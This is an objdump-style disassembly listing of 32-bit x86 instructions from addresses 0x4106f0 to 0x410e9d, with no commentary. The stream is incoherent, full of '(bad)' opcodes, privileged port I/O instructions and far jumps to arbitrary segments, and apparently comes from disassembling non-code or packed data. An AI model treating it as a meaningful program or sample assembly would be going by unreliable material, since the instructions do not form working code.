  4106f0:	mov    BYTE PTR [edi+0xf746d18],al
  4106f6:	nop
  4106f7:	mov    bl,0x5c
  4106f9:	push   ecx
  4106fa:	mov    ecx,DWORD PTR [esi-0x61b7207b]
  410700:	and    dl,BYTE PTR [edx+0x7d]
  410703:	push   eax
  410704:	sbb    ecx,ebp
  410706:	push   ecx
  410707:	test   al,0x9e
  410709:	cmp    al,0x12
  41070b:	in     al,0x6f
  41070d:	push   0xaf16d6b6
  410712:	sti    
  410713:	sub    BYTE PTR [ebp-0x3a4dbd94],ch
  410719:	das    
  41071a:	imul   eax,DWORD PTR [esi-0x3a25dfd9],0x39ef816
  410724:	jo     0x410708
  410726:	icebp  
  410727:	or     ebp,edx
  410729:	inc    edx
  41072a:	mov    edx,DWORD PTR [edx-0x47]
  41072d:	aad    0xb
  41072f:	sub    BYTE PTR [esi],ah
  410731:	lds    edx,FWORD PTR [esi+0x6b06d61]
  410737:	loop   0x410770
  410739:	cli    
  41073a:	mov    DWORD PTR [ecx+0x5c],esi
  41073d:	in     al,dx
  41073e:	mov    DWORD PTR [ebx+0x4],ebp
  410741:	outs   dx,DWORD PTR ds:[esi]
  410742:	stos   DWORD PTR es:[edi],eax
  410743:	jnp    0x41079d
  410745:	cmp    eax,0x4bb677b
  41074a:	pop    ebp
  41074b:	inc    esi
  41074c:	mov    edx,DWORD PTR [ebp-0x569265e2]
  410752:	sub    BYTE PTR [ecx],al
  410754:	loope  0x410734
  410756:	push   cs
  410757:	outs   dx,DWORD PTR ds:[esi]
  410758:	mov    ds:0x5e11ef2b,eax
  41075d:	idiv   DWORD PTR [ebp-0x468ce2b]
  410763:	and    ch,BYTE PTR [edi-0x2a]
  410766:	je     0x410736
  410768:	imul   eax,DWORD PTR [ebx+eiz*2-0x7d9a62ce],0x11eb00d8
  410773:	push   ds
  410774:	ss dec ebp
  410776:	dec    edx
  410777:	ins    DWORD PTR es:[edi],dx
  410778:	or     edi,DWORD PTR [ecx+esi*4-0x32]
  41077c:	(bad)  
  41077d:	outs   dx,BYTE PTR ds:[esi]
  41077e:	push   ss
  41077f:	adc    edx,ebp
  410781:	mov    ?,WORD PTR [ebx]
  410783:	and    DWORD PTR ds:0x94b749d1,ecx
  410789:	shl    BYTE PTR ds:0x5f2101e5,0x85
  410790:	call   0x67d900ae
  410795:	js     0x410805
  410797:	mov    ss,edi
  410799:	adc    eax,0x9e94985a
  41079e:	sub    esp,ebx
  4107a0:	in     eax,dx
  4107a1:	or     eax,0xebc3b9c0
  4107a6:	aad    0x14
  4107a8:	das    
  4107a9:	int    0x7
  4107ab:	jmp    0x56b9:0xc9fcf63b
  4107b2:	dec    ebp
  4107b3:	mov    bh,0x5e
  4107b5:	jp     0x410820
  4107b7:	jo     0x4107ff
  4107b9:	aas    
  4107ba:	cdq    
  4107bb:	shl    BYTE PTR [edx-0x2ed145ec],cl
  4107c1:	loopne 0x410822
  4107c3:	js     0x410768
  4107c5:	sub    al,0x9e
  4107c7:	pop    esi
  4107c8:	aad    0xb3
  4107ca:	jp     0x410772
  4107cc:	nop
  4107cd:	mov    al,0xab
  4107cf:	jno    0x41084c
  4107d1:	loop   0x41080c
  4107d3:	jmp    0xfd94af59
  4107d8:	mov    dh,BYTE PTR [edi+eax*8+0x7fc5f9f4]
  4107df:	push   esi
  4107e0:	jg     0x4107ea
  4107e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107e3:	jg     0x41081c
  4107e5:	sub    ch,BYTE PTR [ecx]
  4107e7:	fild   QWORD PTR [ebp+0x5731573c]
  4107ed:	inc    ecx
  4107ee:	sub    esi,DWORD PTR [esi]
  4107f0:	push   eax
  4107f1:	push   0xffffffdb
  4107f3:	ret    
  4107f4:	or     BYTE PTR [edi],al
  4107f6:	mov    ch,0xf3
  4107f8:	aam    0x3e
  4107fa:	sti    
  4107fb:	sbb    eax,0xde88613c
  410800:	lock mov gs,WORD PTR [eax-0x6bd4da17]
  410807:	pop    esp
  410809:	adc    ah,ch
  41080b:	inc    ebp
  41080c:	pushf  
  41080d:	adc    al,BYTE PTR [esi-0x60c7a199]
  410813:	xor    cl,BYTE PTR [edi]
  410815:	xchg   esp,eax
  410816:	xchg   esi,eax
  410817:	dec    eax
  410818:	cmp    cl,BYTE PTR [esi+0x55bb1b81]
  41081e:	loopne 0x41084e
  410820:	aad    0xe3
  410822:	jp     0x410855
  410824:	inc    edi
  410825:	xor    DWORD PTR [edi+0x2222e1dc],esi
  41082b:	rol    BYTE PTR [edx+0x5e],cl
  41082e:	out    0x1e,eax
  410830:	cmp    bl,BYTE PTR [eax+0x7c282f60]
  410836:	mov    DWORD PTR [eax+0x27],esi
  410839:	xor    ebx,DWORD PTR [esi-0x48bd5fb6]
  41083f:	fld    QWORD PTR ds:0x11e870b0
  410845:	out    dx,eax
  410846:	adc    al,0xa1
  410848:	mov    gs,esi
  41084a:	mov    ah,0x45
  41084c:	lock (bad) 
  41084e:	sub    eax,0xebb59ecd
  410853:	adc    eax,0xe11e6ee9
  410858:	mov    cl,0xd
  41085a:	push   edi
  41085b:	and    BYTE PTR [ebp+0x52],ah
  41085e:	stos   DWORD PTR es:[edi],eax
  41085f:	adc    DWORD PTR [ebx*8-0x2e75e636],0x16c58dad
  41086a:	push   0xffffffa4
  41086c:	dec    ebx
  41086d:	pop    eax
  41086e:	pushf  
  41086f:	and    dl,BYTE PTR [ecx+0x2d88e53c]
  410875:	js     0x4108cc
  410877:	xor    ah,BYTE PTR [esi-0x30724a2f]
  41087d:	jb     0x41081e
  41087f:	shr    dl,0xd
  410882:	(bad)  
  410883:	or     bh,cl
  410885:	sub    ebx,DWORD PTR [ebx-0x4d]
  410888:	xchg   ah,bl
  41088a:	cs addr16 inc ecx
  41088d:	hlt    
  41088e:	(bad)  
  41088f:	ins    BYTE PTR es:[edi],dx
  410890:	dec    edi
  410891:	and    DWORD PTR [ebp+0x5bf509fa],esi
  410897:	ret    
  410898:	arpl   WORD PTR [eax+eiz*4+0x2f],si
  41089c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41089d:	adc    bl,BYTE PTR [edx+0x5a]
  4108a0:	out    0xb6,eax
  4108a2:	das    
  4108a3:	add    al,BYTE PTR [ebp-0x1b]
  4108a6:	add    dh,BYTE PTR [esi+0x77b967ce]
  4108ac:	push   0x14
  4108ae:	pop    DWORD PTR [eax]
  4108b0:	test   DWORD PTR [eax-0xccef3a2],eax
  4108b6:	arpl   bx,cx
  4108b8:	out    dx,eax
  4108b9:	xor    bh,BYTE PTR [edi]
  4108bb:	push   esp
  4108bc:	ficom  WORD PTR [ebp+0x42]
  4108bf:	scas   eax,DWORD PTR es:[edi]
  4108c0:	cmp    DWORD PTR [ebx+0xb112fbf],ecx
  4108c6:	mov    edi,0x1d7c10b2
  4108cb:	jns    0x410869
  4108cd:	xchg   DWORD PTR [esi+0x4820b9f6],edi
  4108d3:	xchg   ebx,eax
  4108d4:	mov    es,WORD PTR [ecx+0x3a7b33a]
  4108da:	pop    edx
  4108db:	mov    eax,0xf439fc4c
  4108e0:	std    
  4108e1:	retf   
  4108e2:	ret    0x6da8
  4108e5:	in     al,dx
  4108e6:	mov    cl,0x51
  4108e8:	cmp    bl,BYTE PTR es:[ecx]
  4108eb:	int3   
  4108ec:	pop    esi
  4108ed:	push   edx
  4108ee:	pop    edi
  4108ef:	fs out 0x55,eax
  4108f2:	sub    ch,BYTE PTR [eax]
  4108f4:	outs   dx,DWORD PTR ds:[esi]
  4108f5:	aam    0xfa
  4108f7:	push   ebp
  4108f8:	jmp    0x41090d
  4108fa:	adc    al,0x36
  4108fc:	stos   DWORD PTR es:[edi],eax
  4108fd:	and    cl,bh
  4108ff:	cmp    esp,DWORD PTR [esi+0x4b197fb9]
  410905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410906:	dec    esp
  410907:	mov    ebp,0x31befa19
  41090c:	aad    0x55
  41090e:	pop    ebx
  41090f:	retf   0xb85f
  410912:	loop   0x4108c2
  410914:	lahf   
  410915:	mov    ds:0x40a2a95b,al
  41091a:	and    ch,al
  41091c:	retf   0x257f
  41091f:	jmp    0x5f2c:0x150dd05c
  410926:	mov    eax,0x9abf13f6
  41092b:	xor    dl,BYTE PTR [edx-0x2b]
  41092e:	jle    0x410935
  410930:	nop
  410931:	pop    ebx
  410932:	push   edx
  410933:	fisubr WORD PTR [eax+0x4b]
  410936:	sbb    ecx,DWORD PTR [eax]
  410938:	xor    bh,BYTE PTR [edi-0x20]
  41093b:	enter  0x80fa,0xcd
  41093f:	add    BYTE PTR [ecx+0x66da703b],0x83
  410946:	ret    
  410947:	loop   0x4108cb
  410949:	dec    edx
  41094a:	xchg   DWORD PTR [ebx],ebp
  41094c:	inc    ecx
  41094d:	imul   ecx,ebp,0xffffffb3
  410950:	sahf   
  410951:	pusha  
  410952:	fsubr  DWORD PTR [ecx+0x2267caf3]
  410958:	add    dh,bl
  41095a:	rcl    DWORD PTR [eax-0x5ffea97e],0xfa
  410961:	fnstsw WORD PTR [ecx-0x31]
  410964:	pop    edx
  410965:	out    dx,al
  410966:	scas   al,BYTE PTR es:[edi]
  410967:	jmp    0x76cc:0x9697a32d
  41096e:	scas   al,BYTE PTR es:[edi]
  41096f:	adc    ebx,DWORD PTR [esi]
  410971:	je     0x410977
  410973:	jmp    0x6aff2225
  410978:	in     eax,0x54
  41097a:	mov    ebx,0x1781f36a
  41097f:	inc    edi
  410980:	fwait
  410981:	imul   esi,ecx,0x27ec399c
  410987:	or     al,0x5a
  410989:	gs mov al,0x2f
  41098c:	data16 adc bh,dh
  41098f:	cmc    
  410990:	add    edi,DWORD PTR [ebp+0x2d]
  410993:	out    0x14,eax
  410995:	jl     0x410990
  410997:	jbe    0x41098d
  410999:	cli    
  41099a:	xchg   edx,eax
  41099b:	push   ecx
  41099c:	in     eax,0xec
  41099e:	scas   al,BYTE PTR es:[edi]
  41099f:	and    BYTE PTR [edi-0x52],bl
  4109a2:	imul   ecx,DWORD PTR [ebx+0x5ad5effe],0x2c23437d
  4109ac:	dec    esi
  4109ad:	jp     0x410988
  4109af:	sbb    eax,0xac8b3e7a
  4109b4:	and    dl,BYTE PTR [edi]
  4109b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109b7:	jnp    0x410961
  4109b9:	stos   DWORD PTR es:[edi],eax
  4109ba:	xchg   ah,al
  4109bc:	out    dx,eax
  4109bd:	enter  0x9a3c,0x52
  4109c1:	fstp   DWORD PTR [esi+0x150cdbe5]
  4109c7:	jle    0x223d4e47
  4109cd:	sub    dl,BYTE PTR [edi+0x4e391846]
  4109d3:	aad    0x19
  4109d5:	pushf  
  4109d6:	xor    eax,0x77630324
  4109db:	scas   al,BYTE PTR es:[edi]
  4109dc:	jnp    0x41099a
  4109de:	xchg   esi,eax
  4109df:	xor    cl,bl
  4109e1:	mov    ebx,0x91be885a
  4109e6:	jle    0x410a14
  4109e8:	repz jp 0x410a39
  4109eb:	bound  edi,QWORD PTR [edx+0x5872584d]
  4109f1:	loopne 0x4109a3
  4109f3:	mov    edx,0x85535864
  4109f8:	inc    edx
  4109f9:	cmp    DWORD PTR [ebx],eax
  4109fb:	call   0xb6f8e081
  410a00:	mov    WORD PTR [ecx-0x45],es
  410a03:	cdq    
  410a04:	cli    
  410a05:	retf   0x7241
  410a08:	retf   0xb98d
  410a0b:	ins    BYTE PTR es:[edi],dx
  410a0c:	lods   al,BYTE PTR ds:[esi]
  410a0d:	pop    eax
  410a0e:	mov    ebx,0x61ae0912
  410a13:	push   esi
  410a14:	xchg   edi,eax
  410a15:	inc    esi
  410a16:	retf   
  410a17:	adc    dl,dl
  410a19:	mov    ch,0xcc
  410a1b:	jbe    0x410a03
  410a1d:	(bad)  
  410a1e:	sbb    ah,BYTE PTR [eax]
  410a20:	jae    0x410a28
  410a22:	iret   
  410a23:	sahf   
  410a24:	ffreep st(4)
  410a26:	retf   
  410a27:	push   eax
  410a28:	mov    dl,0x44
  410a2a:	retf   0x3e66
  410a2d:	das    
  410a2e:	push   ds
  410a2f:	ja     0x410a4e
  410a31:	lock xor al,0x3a
  410a34:	hlt    
  410a35:	adc    DWORD PTR [ecx],0x84dfcb80
  410a3b:	mov    cl,0x15
  410a3d:	(bad)  
  410a3e:	into   
  410a3f:	push   cs
  410a40:	popf   
  410a41:	fwait
  410a42:	dec    esp
  410a43:	(bad)  
  410a44:	sti    
  410a45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a46:	pop    ebx
  410a48:	ret    0xc7bd
  410a4b:	mov    bl,0xf4
  410a4d:	jnp    0x410a80
  410a4f:	push   es
  410a50:	out    0xef,al
  410a52:	pushf  
  410a53:	ror    BYTE PTR [ebx-0x8],0x43
  410a57:	es and ah,BYTE PTR es:[ebp+0x5246d8e4]
  410a5f:	xor    al,0xef
  410a61:	xor    eax,0xbdae4c0e
  410a66:	scas   eax,DWORD PTR es:[edi]
  410a67:	sbb    al,0x89
  410a69:	jmp    0x2f1c:0xda37aa3d
  410a70:	mov    esp,ebp
  410a72:	inc    edi
  410a73:	mov    bl,0x13
  410a75:	cmp    al,0x6
  410a77:	nop
  410a78:	add    DWORD PTR [esi+0x12],esp
  410a7b:	mov    cl,0x5c
  410a7d:	dec    edi
  410a7e:	pop    ebp
  410a7f:	stos   BYTE PTR es:[edi],al
  410a80:	mov    ecx,0x448ba9f7
  410a85:	nop
  410a86:	ret    0xd7c8
  410a89:	mov    bh,dh
  410a8b:	jno    0x410aca
  410a8d:	add    eax,0x32e98556
  410a92:	push   edx
  410a93:	sbb    al,0x33
  410a95:	inc    ebp
  410a96:	adc    ecx,eax
  410a98:	push   ss
  410a99:	add    eax,0x5415a4e4
  410a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a9f:	jmp    0x410abd
  410aa1:	pusha  
  410aa2:	inc    ebp
  410aa3:	pop    ecx
  410aa4:	or     edi,DWORD PTR [ebp-0x26f7dbaf]
  410aaa:	(bad)  
  410aab:	xchg   esp,eax
  410aac:	pop    eax
  410aad:	imul   eax,DWORD PTR [ecx+0x6942ba2],0xffffff92
  410ab4:	mov    ch,0xee
  410ab6:	stos   BYTE PTR es:[edi],al
  410ab7:	or     al,0x94
  410ab9:	dec    esi
  410aba:	fadd   st,st(6)
  410abc:	das    
  410abd:	cmp    edx,DWORD PTR [ecx]
  410abf:	mov    ds:0x6a9ec301,al
  410ac4:	stos   BYTE PTR es:[edi],al
  410ac5:	pop    edi
  410ac6:	pop    ecx
  410ac7:	shr    al,cl
  410ac9:	lods   eax,DWORD PTR ds:[esi]
  410aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410acb:	or     ch,BYTE PTR [edx]
  410acd:	outs   dx,BYTE PTR ds:[esi]
  410ace:	in     al,0x4
  410ad0:	jno    0x410b4c
  410ad2:	sbb    ebx,DWORD PTR [edi-0x32]
  410ad5:	frstor [edx+0x2824fcb8]
  410adb:	fsubr  QWORD PTR [eax]
  410add:	pusha  
  410ade:	aas    
  410adf:	cmp    al,0x84
  410ae1:	cmp    DWORD PTR [eax+0x44],ebp
  410ae4:	add    bl,ch
  410ae6:	mov    bh,0x18
  410ae8:	pop    edx
  410ae9:	or     DWORD PTR [ebx+0x108f5edc],0x6d
  410af0:	xchg   edi,eax
  410af1:	mov    bh,0xe9
  410af3:	out    0x2,eax
  410af5:	sahf   
  410af6:	mov    DWORD PTR [edi],edx
  410af8:	les    edi,FWORD PTR [esi]
  410afa:	sbb    DWORD PTR [edi+0x77398e0e],eax
  410b00:	les    ebx,FWORD PTR [ebx-0x6b]
  410b03:	and    DWORD PTR [eax+0xb12d723],0x30
  410b0a:	scas   al,BYTE PTR es:[edi]
  410b0b:	std    
  410b0c:	pop    edx
  410b0d:	or     al,0x74
  410b0f:	pop    esp
  410b10:	stc    
  410b11:	mov    ecx,0xe1534f8a
  410b16:	aas    
  410b17:	xchg   esp,eax
  410b18:	sub    bl,0xf9
  410b1b:	pop    edi
  410b1c:	jne    0x410aad
  410b1e:	test   DWORD PTR [esi-0x5df82f0c],eax
  410b24:	cmp    BYTE PTR [esi-0x24],al
  410b27:	mov    ds:0x62f4ce07,al
  410b2c:	out    0x2a,eax
  410b2e:	inc    esp
  410b2f:	aaa    
  410b30:	or     bh,ah
  410b32:	ret    
  410b33:	(bad)  
  410b34:	data16 xor al,0x98
  410b37:	xchg   ebp,eax
  410b38:	cmp    bh,ah
  410b3a:	ins    BYTE PTR es:[edi],dx
  410b3b:	addr16 xor eax,0x68890ef6
  410b41:	sub    al,0x5f
  410b43:	sub    BYTE PTR [edi+ebx*8-0x3d],0x85
  410b48:	out    0x3b,eax
  410b4a:	lea    edi,[ecx]
  410b4c:	push   eax
  410b4d:	sub    edx,ebp
  410b4f:	neg    ebp
  410b51:	in     eax,0x9d
  410b53:	lahf   
  410b54:	ds pusha 
  410b56:	push   0xffffff9e
  410b58:	cdq    
  410b59:	jae    0x410b1c
  410b5b:	sub    eax,0x39fb84
  410b60:	adc    ch,ah
  410b62:	jb     0x410b90
  410b64:	jmp    0xaf52:0x2d3a8040
  410b6b:	jo     0x410b89
  410b6d:	cmp    eax,ebp
  410b6f:	push   ss
  410b70:	xor    BYTE PTR [edi],0xbf
  410b73:	mov    esi,0xf293218a
  410b78:	jl     0x410b81
  410b7a:	push   esp
  410b7b:	add    al,dh
  410b7d:	inc    esi
  410b7e:	pcmpgtw mm5,QWORD PTR [ebp-0x67]
  410b82:	mov    esi,ss
  410b84:	push   DWORD PTR ds:0x1bae5285
  410b8a:	jle    0x410b76
  410b8c:	lods   al,BYTE PTR ds:[esi]
  410b8d:	and    eax,0x60d0e627
  410b92:	repz cdq 
  410b94:	pop    edx
  410b95:	inc    ebp
  410b96:	les    di,DWORD PTR [edx-0x3d]
  410b9a:	jecxz  0x410b6b
  410b9c:	dec    ecx
  410b9d:	or     bl,BYTE PTR [edi+ecx*2-0x65b4440e]
  410ba4:	push   cs
  410ba5:	pop    DWORD PTR [ebx]
  410ba7:	push   ebp
  410ba8:	dec    ebp
  410ba9:	popf   
  410baa:	(bad)  
  410bab:	sbb    al,0xc1
  410bad:	test   eax,0x34bd9f5
  410bb2:	(bad)  
  410bb3:	sub    DWORD PTR [esi],edx
  410bb5:	sti    
  410bb6:	inc    edx
  410bb7:	xchg   edi,eax
  410bb8:	mov    al,ds:0x1f762936
  410bbd:	test   al,0x7e
  410bbf:	pop    ds
  410bc0:	xchg   ecx,eax
  410bc1:	or     al,0xce
  410bc3:	adc    ebx,esi
  410bc5:	mov    WORD PTR [edi],?
  410bc7:	fst    st(6)
  410bc9:	jns    0x410bd4
  410bcb:	aad    0x1
  410bcd:	jmp    0xa706434e
  410bd2:	xor    BYTE PTR [ecx+eax*1],cl
  410bd5:	leave  
  410bd6:	mov    eax,ds:0x41c84cf6
  410bdb:	loope  0x410c45
  410bdd:	(bad)  
  410bde:	call   0x9291bc5f
  410be3:	adc    cl,BYTE PTR ds:[ecx]
  410be6:	sbb    bh,BYTE PTR [eax+0x72]
  410be9:	sbb    DWORD PTR [edx],ebp
  410beb:	add    BYTE PTR [esi+0x43c0f321],cl
  410bf1:	mov    ecx,0xb0691762
  410bf6:	and    dh,BYTE PTR [edi-0x58]
  410bf9:	dec    esp
  410bfa:	sbb    BYTE PTR [edx+0x32],dh
  410bfd:	out    dx,al
  410bfe:	ja     0x410c2e
  410c00:	pushf  
  410c01:	cdq    
  410c02:	mov    esi,0xfe3c29e5
  410c07:	rcr    ebx,1
  410c09:	pop    esp
  410c0a:	mov    BYTE PTR [eax+0x79],dl
  410c0d:	xchg   edi,eax
  410c0e:	pop    ebx
  410c0f:	pop    ds
  410c10:	int3   
  410c11:	popf   
  410c12:	cdq    
  410c13:	fwait
  410c14:	popa   
  410c15:	mov    esp,0xb06d3448
  410c1a:	sub    dl,dh
  410c1c:	push   edx
  410c1d:	ror    BYTE PTR [ebx],cl
  410c1f:	and    ebp,DWORD PTR [esi+0x30fee470]
  410c25:	outs   dx,DWORD PTR ds:[esi]
  410c26:	enter  0x3307,0x3e
  410c2a:	or     eax,0x8c69fba7
  410c2f:	mov    ebp,fs
  410c31:	mov    eax,ds:0x3f62737b
  410c36:	popf   
  410c37:	push   ds
  410c38:	mov    ds:0x42152380,eax
  410c3d:	fisttp DWORD PTR ds:0xb0f239a6
  410c43:	sub    dl,al
  410c45:	pop    es
  410c46:	test   BYTE PTR [esi-0xa998c4d],al
  410c4c:	dec    edx
  410c4d:	faddp  st(2),st
  410c4f:	inc    DWORD PTR [esi+0x70]
  410c52:	iret   
  410c53:	call   0x81a3fe50
  410c58:	and    bh,cl
  410c5a:	inc    esp
  410c5b:	loop   0x410c9a
  410c5d:	les    eax,FWORD PTR ds:0x5aee0aca
  410c63:	leave  
  410c64:	leave  
  410c65:	or     eax,0x45586c9
  410c6a:	xchg   ecx,eax
  410c6b:	mov    bl,0x98
  410c6d:	xchg   esi,eax
  410c6e:	(bad)  
  410c6f:	sbb    al,0xf5
  410c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c72:	les    eax,FWORD PTR [ecx+0x5b73dee4]
  410c78:	int3   
  410c79:	in     al,0x7e
  410c7b:	add    edx,DWORD PTR [esi-0x6791f31c]
  410c81:	push   cs
  410c82:	pop    ebp
  410c83:	fdiv   DWORD PTR [ecx+ecx*4-0x448d183d]
  410c8a:	pop    eax
  410c8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c8c:	leave  
  410c8d:	out    0x1,al
  410c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c90:	fstp   st(4)
  410c92:	test   eax,0x37a7e97d
  410c97:	std    
  410c98:	outs   dx,BYTE PTR ds:[esi]
  410c99:	nop
  410c9a:	push   cs
  410c9b:	cmp    DWORD PTR [ecx+0x67],ecx
  410c9e:	xor    ch,BYTE PTR [esi+0x64]
  410ca1:	add    al,BYTE PTR ds:0x8ebfd2b3
  410ca7:	pop    ss
  410ca8:	iret   
  410ca9:	imul   ebx,DWORD PTR [eax-0x1b],0x4a80d614
  410cb0:	not    edx
  410cb2:	jle    0x410c8f
  410cb4:	rcr    BYTE PTR [ecx+0x65],1
  410cb7:	inc    esi
  410cb8:	adc    eax,0x4ce909e1
  410cbd:	test   ecx,edi
  410cbf:	test   BYTE PTR [ecx],dh
  410cc1:	push   0x3ac881d7
  410cc6:	pushf  
  410cc7:	pop    ds
  410cc8:	cmp    dh,cl
  410cca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ccb:	push   ds
  410ccc:	jge    0x410cf4
  410cce:	add    DWORD PTR [edi],eax
  410cd0:	in     eax,0xe7
  410cd2:	add    eax,0x92bff6f4
  410cd7:	cmp    ebp,DWORD PTR [ecx-0x7496d81c]
  410cdd:	jge    0x410d39
  410cdf:	mov    ebx,0x77e3476c
  410ce4:	int3   
  410ce5:	es xor al,0x31
  410ce8:	sti    
  410ce9:	sub    al,0x5d
  410ceb:	adc    edx,esi
  410ced:	jg     0x410d28
  410cef:	sbb    DWORD PTR ds:0x35d20215,ebx
  410cf5:	mov    al,0xb7
  410cf7:	retfw  0x1529
  410cfb:	and    BYTE PTR [ebp-0x5d],al
  410cfe:	and    eax,0x6245d7af
  410d03:	adc    BYTE PTR [esi],bh
  410d05:	inc    ebp
  410d06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d08:	hlt    
  410d09:	clc    
  410d0a:	mov    ah,0x7d
  410d0c:	icebp  
  410d0d:	mov    edx,0x9d9917ee
  410d12:	inc    ebp
  410d13:	jb     0x410cd2
  410d15:	fadd   st,st(5)
  410d17:	jae    0x410d41
  410d19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d1a:	fbstp  TBYTE PTR [edx+0x78c156f6]
  410d20:	rol    bl,cl
  410d22:	dec    edi
  410d23:	mov    ecx,0xabcbdb30
  410d28:	add    ebp,ecx
  410d2a:	jno    0x410d49
  410d2c:	jnp    0x410cf6
  410d2e:	pop    eax
  410d2f:	xor    esi,0xffffffa0
  410d32:	pop    eax
  410d33:	test   DWORD PTR [ecx+0x7d],0x4301ec7a
  410d3a:	in     al,dx
  410d3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d3c:	adc    BYTE PTR [edx],ch
  410d3e:	fst    DWORD PTR [ebp+esi*1-0xe]
  410d42:	xchg   esp,eax
  410d43:	fld    st(0)
  410d45:	pusha  
  410d46:	dec    ecx
  410d47:	mov    ah,0xbb
  410d49:	xor    eax,0x9a04b1a
  410d4e:	jle    0x410d0f
  410d50:	add    BYTE PTR [esi-0x52],bh
  410d53:	dec    esi
  410d54:	clc    
  410d55:	ja     0x410ced
  410d57:	je     0x410daf
  410d59:	mov    esp,0xed60d3a1
  410d5e:	xlat   BYTE PTR ds:[ebx]
  410d5f:	adc    BYTE PTR [edi],ah
  410d61:	call   0x918868a2
  410d66:	pushf  
  410d67:	inc    ebx
  410d68:	(bad)
  410d6d:	test   dl,0x4f
  410d70:	fstp   DWORD PTR ds:0x54050b20
  410d76:	retf   
  410d77:	call   FWORD PTR [ecx]
  410d79:	aas    
  410d7a:	adc    BYTE PTR [esp+ebx*1+0x3d50248f],dl
  410d81:	scas   al,BYTE PTR es:[edi]
  410d82:	fsub   DWORD PTR [ebp-0x24cf547f]
  410d88:	in     eax,0x9
  410d8a:	fmul   DWORD PTR [esi]
  410d8c:	push   ds
  410d8d:	sti    
  410d8e:	cs (bad) 
  410d90:	pop    edx
  410d91:	data16 loop 0x410d83
  410d94:	popw   ds
  410d96:	pop    ecx
  410d97:	jmp    0x410d39
  410d99:	outs   dx,DWORD PTR ds:[esi]
  410d9a:	sub    eax,ecx
  410d9c:	xlat   BYTE PTR ds:[ebx]
  410d9d:	cmp    BYTE PTR [eax],dh
  410d9f:	outs   dx,BYTE PTR ds:[esi]
  410da0:	jge    0x410d8f
  410da2:	cmp    cl,BYTE PTR [edx*4+0x36a1039a]
  410da9:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  410dab:	jo     0x410e07
  410dad:	aad    0x47
  410daf:	repz sub dl,dh
  410db2:	(bad)  
  410db3:	mov    ch,0x37
  410db5:	sub    ebp,DWORD PTR ds:0xe6927b0c
  410dbb:	call   0x95ed:0xb83f46eb
  410dc2:	adc    ch,dl
  410dc4:	lahf   
  410dc5:	mov    dl,0x59
  410dc7:	vandps xmm7,xmm6,xmm0
  410dcb:	(bad)  
  410dcc:	sbb    al,0x91
  410dce:	jae    0x410d97
  410dd0:	mov    ebx,DWORD PTR [ecx+0xf]
  410dd3:	or     eax,0x40beb9b9
  410dd8:	ss inc eax
  410dda:	push   0x7d
  410ddc:	in     al,0x81
  410dde:	hlt    
  410ddf:	inc    eax
  410de0:	mov    dh,0xd3
  410de2:	mov    ebp,0x85019133
  410de7:	sub    eax,0x1179c70e
  410dec:	ret    
  410ded:	lods   al,BYTE PTR ds:[esi]
  410dee:	mov    cl,0x94
  410df0:	or     al,0x44
  410df2:	mov    dh,0x16
  410df4:	push   esi
  410df5:	in     al,dx
  410df6:	repnz lea esp,[esi]
  410df9:	loop   0x410e20
  410dfb:	sbb    ah,BYTE PTR [ebp+esi*4+0x54]
  410dff:	mov    al,ds:0xc5558e38
  410e04:	xrstors [edx-0x16db3f2e]
  410e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e0c:	neg    DWORD PTR [eax]
  410e0e:	mov    edi,0xc70b8df7
  410e13:	jle    0x410e5a
  410e15:	rol    BYTE PTR [ecx+0x36],1
  410e18:	push   edi
  410e19:	out    dx,al
  410e1a:	icebp  
  410e1b:	xor    ebx,eax
  410e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e1e:	cmp    DWORD PTR [edx],esp
  410e20:	push   ss
  410e21:	cs sbb bh,0x61
  410e25:	nop
  410e26:	and    al,0x7e
  410e28:	pushf  
  410e29:	aaa    
  410e2a:	adc    cl,ch
  410e2c:	repnz out 0xde,al
  410e2f:	in     eax,0xe3
  410e31:	and    dh,bl
  410e33:	mov    al,ds:0xd59df645
  410e38:	mov    edi,0xea7610b7
  410e3d:	int3   
  410e3e:	cwde   
  410e3f:	adc    eax,edi
  410e41:	cmc    
  410e42:	in     al,0xcc
  410e44:	adc    ebx,DWORD PTR [edx]
  410e46:	inc    edx
  410e47:	jno    0x410e55
  410e49:	test   al,0x89
  410e4b:	fs jl  0x410eb7
  410e4e:	sbb    dh,BYTE PTR ds:0xd71b4326
  410e54:	fistp  WORD PTR ds:[edi-0x313a46]
  410e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e5c:	enter  0x852d,0xd6
  410e60:	mov    bl,0x92
  410e62:	test   BYTE PTR [edi-0x6b],cl
  410e65:	dec    esi
  410e66:	in     al,0xd1
  410e68:	(bad)  
  410e69:	sbb    BYTE PTR [edi+0x720bd20f],0xfa
  410e70:	sub    DWORD PTR [ebp-0x53],ebp
  410e73:	xor    cl,BYTE PTR [esi+0x65]
  410e76:	xchg   esp,eax
  410e77:	iret   
  410e78:	mov    eax,ds:0x7d14bac7
  410e7d:	popa   
  410e7e:	lea    eax,[edx]
  410e80:	inc    esi
  410e81:	sub    ch,BYTE PTR [esi]
  410e83:	or     eax,0x3f361aa4
  410e88:	call   0x70f4:0x1ed5b954
  410e8f:	jmp    0x410e6e
  410e91:	mov    eax,0x3bf8412
  410e96:	push   esp
  410e97:	ins    BYTE PTR es:[edi],dx
  410e98:	arpl   bx,ax
  410e9a:	cdq    
  410e9b:	aam    0x3c
  410e9d:	pop    eax
